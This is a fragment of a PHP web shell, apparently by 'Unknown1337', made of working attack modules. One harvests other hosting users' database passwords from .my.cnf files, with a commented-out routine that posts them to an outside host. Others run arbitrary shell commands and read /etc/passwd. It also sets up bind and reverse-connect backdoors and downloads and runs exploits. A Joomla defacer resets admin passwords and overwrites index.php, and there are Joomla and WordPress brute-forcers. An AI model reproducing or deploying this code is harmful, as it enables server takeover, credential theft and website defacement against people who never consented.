echo "<li> <a href='?dir=$dir&do=hashid'>HashID</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Generate</a> </li>";
echo "<li> <a href='?dir=$dir&do=domains'>Domains Viewer</a></li>";
echo "<li> <a href='?dir=$dir&do=reverse'>ReverseIP</a> </li>";
echo "<li> <a href='?dir=$dir&do=ddosattack'>DDOS</a> </li>";
echo "<li> <a href='?dir=$dir&do=adfin'>Admin Finder</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=bypass-cf'>Bypass CloudFlare</a></li>";
echo "<li> <a href='?dir=$dir&do=bypassserver'>Bypass Server</a></li>";
echo "<li> <a href='?dir=$dir&do=vhost'>Bypass vHost</a> </li>";
echo "<li> <a href='?dir=$dir&do=passwbypass'>Bypass Etc/Passwd</a> </li>";
echo "<li> <a href='?dir=$dir&do=cpftp_auto'>Bomb Mailer</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=zip'>Zip Menu</a></li>";
echo "<li> <a href='?dir=$dir&do=phpinfo'>PHP Info</a></li>";
echo "<li> <a href='?dir=$dir&do=loghunter'>Log Hunter</a></li>";
echo "<li> <a href='?dir=$dir&do=logs'>Delete Logs</a></li>";
echo "<li> <a href='?dir=$dir&do=contact'>Contact Me</a></li>";
echo "<li> <a href='?dir=$dir&do=about'>About Me</a></li><br><br>";
echo "<li> <a href='?shell&do=kill'>KillSelf</a></li> ";
echo "<li> <a href='?byee&do=logout' style='color:red;'> Logout</a></li> ";

echo "</ul>";
echo "</center>";
echo "<hr color='red'>";
echo "</div>";
echo "<br>";
echo "<center>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "[ ".w($dir, perms($dir))." ]";
echo "<br>";
echo "<br>";

	if($_GET['do'] == 'grabcpanel') {
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
echo '<br><br><style>
textarea {
resize:none;
color:black;
background-color:#ffffff;  
font-size:8pt; color:black;
border:1px solid white ;
border-left: 4px solid white ;
}
input {
color: black;
border:1px dotted white;
}
</style>';
echo '<center>';
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align=center><tr><th valign=top  class=style2> COUNT </th><th valign=top > DOMAIN </th><th valign=top class=style2 > USER </th><th valign=top class=style2 > Password </th><th valign=top class=style2 > .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top style=border :2px solid white; width: 139px class=style2>".$count++."</td><td valign=top style= width: 139px; border :2px solid white  class=style2 ><a href=http://".$domain.":2082 target=_blank>".$domain."</a></td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$owner['name']."</td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$password."</td><td valign=top style=border :2px solid white style=width: 139px><a href=".$owner['name'].".txt target=_blank>Click Here</a></td></tr>";
$dc++;
$success3="http://".$domain."|".$owner['name']."|".$password."\n";
//Fungsi log dinonaktifkan oleh Unknown1337
/*
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://ww3s.ws/ok.php");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"result=".base64_encode($success3));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$buffer = curl_exec($ch);
*/
}
}
}
echo '</table>';
$total = $dc;
 
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align=center><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top class=style2 style=width: 139px>".$count++."</td><td valign=top class=style2 style=width: 139px><a target=_blank href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td valign=top class=style2 style=width: 139px>'.$r."</td><td valign=top class=style2 style=width: 139px>".$password."</td><td valign=top class=style2 style=width: 139px><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                }
            }
            }
echo '</table>';
$total = $dc;
echo '<br><div class=result valign=top class=style2 style=width: 139px >Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
}
 
}else{
echo "<div class=result><i><font color=#FF0000>ERROR</font><br><font color=#FF0000>/var/named</font> or <font color=#FF0000>etc/named.conf</font> Not Accessible!</i></div>";
}
}
elseif($_GET['do'] == 'bypassserver') { 
?>
<form action="?dir=<?php echo $pwd; ?>&amp;do=bypassserver" method="post">
<center/><br/><b><font color=white>-=[ Command  Bypass Exploit  By Unknown1337 ]=-</font></b><br>
<?php
print_r('
<pre>
<form method="POST" action="">
<b><font color=white><b><font color="white">Command </font></font></b><input name="baba" type="text" class="inputz" size="34">&nbsp;<input type="submit" class="inputzbut" value="Go">
</form>
<form method="POST" action=""><strong><b><font color="white">Menu Bypass</font></strong><select name="liz0" size="1" class="inputz">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">netstat</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <input type="submit" class="inputzbut" value="G&ouml;">
</form>
</pre>
');
ini_restore("safe_mode");
ini_restore("open_basedir");
$liz0=shell_exec($_POST[baba]); 
$liz0zim=shell_exec($_POST[liz0]); 
$uid=shell_exec('id');
$server=shell_exec('uname -a');
echo "<pre><h4>";

echo $liz0;
echo $liz0zim;
echo "</h4></pre>";
 "</div>"; 
 ?>
 <?php }

elseif($_GET['do'] == 'bypass-cf'){	
echo '
<form method="POST"><br><br>
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass CloudFlare By Unknown1337 ]=--+
</font></b></p>
<select class="inputz" name="krz">
	<option>ftp</option>
		<option>direct-conntect</option>
			<option>webmail</option>
				<option>cpanel</option>
</select>
<input class="inputz" type="text" name="target" value="url">
<input class="inputzbut" type="submit" value="Bypass"></center>

';

$target = $_POST['target'];
# Bypass From FTP
if($_POST['krz'] == "ftp") {
$ftp = gethostbyname("ftp."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
} 
# Bypass From Direct-Connect
if($_POST['krz'] == "direct-conntect") {
$direct = gethostbyname("direct-connect."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
}
# Bypass From Webmail
if($_POST['krz'] == "webmail") {
$web = gethostbyname("webmail."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
}
# Bypass From Cpanel
if($_POST['krz'] == "cpanel") {
$cpanel = gethostbyname("cpanel."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
}
}

elseif($_GET['do'] == 'netsploit'){ 

// bind connect with c
if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdc.c",$port_bind_bd_c);
 	exe("gcc -o bdc bdc.c");
 	exe("chmod 777 bdc");
 	@unlink("bdc.c");
 	exe("./bdc ".$port." ".$passwrd." &");
 	$scan = exe("ps aux"); 
	if(eregi("./bdc $por",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg =  "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// bind connect with perl
elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdp",$port_bind_bd_pl);
	exe("chmod 777 bdp");
 	$p2=which("perl");
 	exe($p2." bdp ".$port." &");
 	$scan = exe("ps aux"); 
	if(eregi("$p2 bdp $port",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// back connect with c
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcc.c",$back_connect_c);
 	exe("gcc -o bcc bcc.c");
 	exe("chmod 777 bcc");
 	@unlink("bcc.c");
	exe("./bcc ".$ip." ".$port." &");
	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
// back connect with perl
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcp",$back_connect);
	exe("chmod +x bcp");
	$p2=which("perl");
 	exe($p2." bcp ".$ip." ".$port." &");
 	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd']))
{
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$namafile = download($pilihan,$wurl);
	if(is_file($namafile)) {
	
	$msg = exe($wcmd);
	}
	else $msg = "error: file not found $namafile";
}

?>
<table class="tabnet">
<tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr>
<tr>
<td>
<table>
<form method="post" action="?dir=<?php echo $pwd; ?>&amp;do=netsploit">
<tr>
	<td>Port <br><br><br>Pass<br><br><br><br><br></td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"><br><br><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"><br><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select><br><input class="inputzbut" type="submit" name="bind" value="Bind" style="width:80px"></td></tr>
</form>
</table>
</td>
<td>
<table>
<form method="post" action="?dir=<?php echo $pwd; ?>&amp;do=netsploit">
<tr><td>IP<br><br><br>Port<br><br><br><br><br></td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"><br><br><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"><br><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select><br><input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:80px"></td></tr>

</form>
</table>
</td>
<td>
<table>
<form method="post" action="?dir=<?php echo $pwd; ?>&amp;do=netsploit">
<tr><td>url<br><br><br>cmd<br><br><br><br><br></td><td><input class="inputz" type="text" name="wurl" style="width:180px;" value="www.some-code/exploits.c"><br><br><input class="inputz" type="text" name="wcmd" style="width:180px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"><br><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select><br><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:80px;"></td></tr>
</form>
</table>
</td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php } 

elseif($_GET['do'] == 'jodexer'){	
?>
<form action="?dir=<?php echo $pwd; ?>&amp;do=jodexer" method="post">

<?php

function randomt() {
    
        $chars = "abcdefghijkmnopqrstuvwxyz023456789";
        srand((double)microtime()*1000000);
        $i = 0;
        $pass = '' ;
    
        while ($i <= 7) {
            $num = rand() % 33;
            $tmp = substr($chars, $num, 1);
            $pass = $pass . $tmp;
            $i++;
        }
    
        return $pass;
    
    }
    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
    {
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    $ar=trim($ar1[0]);
    return $ar;
    }
    if ($_POST['form_action'])
    {
    
    $text=file_get_contents($_POST['file']);
    $username=entre2v2($text,"public $user = '","';");
    $password=entre2v2($text,"public $password = ', '","';");
    $dbname=entre2v2($text,"public $db = ', '","';");
    $dbprefix=entre2v2($text,"public $dbprefix = '","';");
    $site_url=($_POST['site_url']);
    
    $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";
    
    $co=randomt();  
      /*
    echo($username);
    echo("<br>");
    echo($password);
    echo("<br>");
    echo($dbname);
    echo("<br>");
    echo($dbprefix);
    echo("<br>");
    */
    $co=randomt();
    
    if ($_POST['form_action'])
    {
    $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";
    
    
    
    
    
          $link=mysql_connect("dzoed.druknet.bt",$username,$password) ;
    
             mysql_select_db($dbname,$link) ;
    
    $tryChaningInfo = mysql_query("UPDATE ".$dbprefix."users SET username ='admin' , password = '2a9336f7666f9f474b7a8f67b48de527:DiWqRBR1thTQa2SvBsDqsUENrKOmZtAX'");
    echo("<br>[+] Changing admin password to 123456789");  
                    
                     $req =mysql_query("SELECT * from  `".$dbprefix."extensions` ");
                    
    if ( $req )
    {
    #################################################################
    ######################        V1.6         ######################
    #################################################################
    
                  
    $req =mysql_query("SELECT * from  `".$dbprefix."template_styles` WHERE client_id='0' and home='1'");
             $data = mysql_fetch_array($req);
    $template_name=$data["template"];
    
    $req =mysql_query("SELECT * from  `".$dbprefix."extensions` WHERE name='".$template_name."'");
             $data = mysql_fetch_array($req);
    $template_id=$data["extension_id"];
    
    $url2=$site_url."/index.php";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    
    
    $buffer = curl_exec($ch);
    
    $return=entre2v2($buffer ,'<input type="hidden" name="return" value="','"');
    $hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);
    
    ///////////////////////////
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&return=".$return."&".$hidden."=1");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,"com_config");
    if($pos === false) {
    echo("<br>[-] Login Error");
    exit;
    }
    else {
    echo("<br>[~] Login Successful");
    }
    ///////////////////////////
    $url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);
    if($hidden2) {
    echo("<br>[+] index.php file founded in Theme Editor");
    }
    else {
    echo("<br>[-] index.php Not found in Theme Editor");
    exit;
    }
    echo("<br>[*] Updating Index.php .....");
    $url2=$site_url."/index.php?option=com_templates&layout=edit";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$h."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");
    
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,'<dd class="message message">');
    if($pos === false) {
    echo("<br>[-] Updating Index.php Error");
    exit;
    }
    else {
    echo("<br>[~] index.php successfully saved");
    }
    #################################################################
    ######################      V1.6  END      ######################
    #################################################################
    
    
    }
    else
    {
    
    #################################################################
    ######################      V1.5           ######################
    #################################################################
                    
    $req =mysql_query("SELECT * from  `".$dbprefix."templates_menu` WHERE client_id='0'");
             $data = mysql_fetch_array($req);
    $template_name=$data["template"];
    
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);
    
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&".$hidden."=1");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,"com_config");
    
    if($pos === false) {
    echo("<br>[-] Login Error");
    exit;
    }
    else {
    echo("<br>[+] Login Successful");
    }
    ///////////////////////////
    $url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);
    
    if($hidden2) {
    echo("<br>[~] index.php file founded in Theme Editor");
    }
    else {
    echo("<br>[-] index.php Not found in Theme Editor");
    }
    
    echo("<br>[*] Updating Index.php .....");
    $url2=$site_url."/index.php?option=com_templates&layout=edit";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$h."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,'<dd class="message message fade">');
    if($pos === false) {
    echo("<br>[-] Updating Index.php Error");
    exit;
    }
    else {
    echo("<br>[~] index.php successfully saved");
    }
    #################################################################
    ######################      V1.5  END      ######################
    #################################################################
    
    }
    
    }
    
    
    function randomt() {
    
        $chars = "abcdefghijkmnopqrstuvwxyz023456789";
        srand((double)microtime()*1000000);
        $i = 0;
        $pass = '' ;
    
        while ($i <= 7) {
            $num = rand() % 33;
            $tmp = substr($chars, $num, 1);
            $pass = $pass . $tmp;
            $i++;
        }
    
        return $pass;
    
    }
    
    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
    
    {
    
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    $ar=trim($ar1[0]);
    return $ar;
    }
    
    }?>
    <center><br><br>
    <font color="white" size='+3'><b>+--=[ Automatic Joomla Index Changer By Unknown1337 ]=--+</b></font><br><br>
    </center>
    <center><b>
    Link of symlink configuration.php of Joomla<br></b>
    <FORM action=""  method="post">
    <input type="hidden" name="form_action" value="1">
     <input type="text" class="inputz" size="60" name="file" value="http://site.com/sym/home/user/public_html/configuration.php">
    <br>
    <br><b>
    Admin Control panel url</b><br>
    <input type="text" class="inputz" size="40" name="site_url" value="http://site/administrator"><br>
    <br><b>
    Your Index Code</b>
    <br>
    <TEXTAREA rows="20" align="center" style="background:black" cols="120" name="code"> your index code
            </TEXTAREA>
            <br>
    <INPUT  class="inputzbut" type="submit" value="Lets Go Deface !!!" name="Submit">
    </FORM>
     </center>
    <script language=JavaScript>m='%09%09%09%09%09%09%09%3C/td%3E%0A%09%09%09%09%09%09%3C/tr%3E%0A%09%09%09%09%09%3C/table%3E%0A%09%09%09%09%3C/td%3E%0A%3C/html%3E';d=unescape(m);document.write(d);</script>
	<?php
}
elseif($_GET['do'] == 'jbrute'){ 
?>
<form action="?dir=<?php echo $pwd; ?>&amp;do=jbrute" method="post">

	<meta name="author" content="Unknown1337" />
    <meta name="keywords" content="Joomla, Bruter, JoomlaBruter, JoomlaBruterForce, JoomlaBruterForceOnline" />
    <meta name="description" content="Unknown1337" />
<center>
</br></br>
<center><b><font color="lime">+--=[ Joomla Brute Force By Unknown1337 ]=--+</font></b><br /><br />
<form method="post" action="" enctype="multipart/form-data"> 
<table class="tabnet" width="38%" border="0"><center>
<th colspan="2">Joomla Brute Force</th>
<tr><td><p ><font  class="d1">User :</font></th>
<input class="inputz" type='text' name="usr" value="admin" size="15"> </font></center><br /><br /></p>
</td></tr>
<tr><td><font class="">Sites list :</font> 
</td><td><font class="" >Pass list :</font></td></tr>
<tr>
		<td>
<textarea name="sites" style="background:black;" cols="40" rows="13" ></textarea>
</td><td>
<textarea name="w0rds" style="background:black;" cols="40" rows="13" >
admin
123456
password
102030
123123
12345
123456789
pass
test
admin123
demo
!@#$%^
</textarea>
</td></tr><center><tr><td>
<font > 
<input class="inputzbut" type="submit" name="x" value="start" id="d4"> 
</font></td></tr><br>
Greetz : All Indonesian Hackers <br></center></table>
</form></center>
<?php
@set_time_limit(0); 
if($_POST['x']){ 

echo "<hr>"; 

$sites = explode("\n",$_POST["sites"]); // Get Sites 
$w0rds = explode("\n",$_POST["w0rds"]); // Get w0rdLiSt 

$Attack = new Joomla_brute_Force(); // Active Class 


foreach($w0rds as $pwd){ 

foreach($sites as $site){ 


$Attack->check_it(txt_cln($site),$_POST['usr'],txt_cln($pwd)); // Brute :D 
flush();flush(); 

} 

} 

} 


# Class & Function'z 

function txt_cln($value){  return str_replace(array("\n","\r"),"",$value); } 

class Joomla_brute_Force{ 

public function check_it($site,$user,$pass){ // print result 

if(eregi('com_config',$this->post($site,$user,$pass))){ 

echo "<span class=\"x2\"><b># Success : $user:$pass -> <a href='$site/administrator/index.php'>$site/administrator/index.php</a></b></span><BR>";
$f = fopen("Result.txt","a+"); fwrite($f , "Success ~~ $user:$pass -> $site/administrator/index.php\n"); fclose($f); 
flush(); 
}else{ echo "# Failed : $user:$pass -> $site<BR>"; flush();} 

} 

public function post($site,$user,$pass){ // Post -> user & pass 

$token = $this->extract_token($site); 

$curl=curl_init(); 

curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); 
curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php"); 
@curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt'); 
@curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt'); 
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4'); 
@curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); 
curl_setopt($curl,CURLOPT_POST,1); 
curl_setopt($curl,CURLOPT_POSTFIELDS,'username='.$user.'&passwd='.$pass.'&lang=en-GB&option=com_login&task=login&'.$token.'=1'); 
curl_setopt($curl,CURLOPT_TIMEOUT,20); 

$exec=curl_exec($curl); 
curl_close($curl); 
return $exec; 

} 

public function extract_token($site){ // get token from source for -> function post 

$source = $this->get_source($site); 

preg_match_all("/type=\"hidden\" name=\"([0-9a-f]{32})\" value=\"1\"/si" ,$source,$token); 

return $token[1][0]; 

} 

public function get_source($site){ // get source for -> function extract_token 

$curl=curl_init(); 
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); 
curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php"); 
@curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt'); 
@curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt'); 
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4'); 
@curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); 
curl_setopt($curl,CURLOPT_TIMEOUT,20); 

$exec=curl_exec($curl); 
curl_close($curl); 
return $exec; 

} 

} 
}

elseif($_GET['do'] == 'wpbrute'){	
?>
<form action="?dir=<?php echo $pwd; ?>&amp;do=wpbrute" method="post">
<center>
<br><Br><b><font size='2' >+--=[ Wordpress Brute Force  By Unknown1337 ]=--+</font><br>
<form enctype="multipart/form-data" method="POST">
  <table width='624' border='0' class='tabnet' id='Box'>
  <tr><th colspan="5">Wordpress Brute Force</th></tr>
    

    <tr>
      <td >&nbsp;</td>
      <td ><p>Hosts:</p></td>
      <td ><p> Users:</p></td>
      <td ><p>Passwords:</p></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td ><textarea style="background:black;" name="hosts" cols="30" rows="10" ><?php if($_POST){echo $_POST['hosts'];} ?></textarea></td>
      <td ><textarea style="background:black;" name="usernames" cols="30" rows="10"  ><?php if($_POST){echo $_POST['usernames'];}else {echo "admin";} ?></textarea></td>
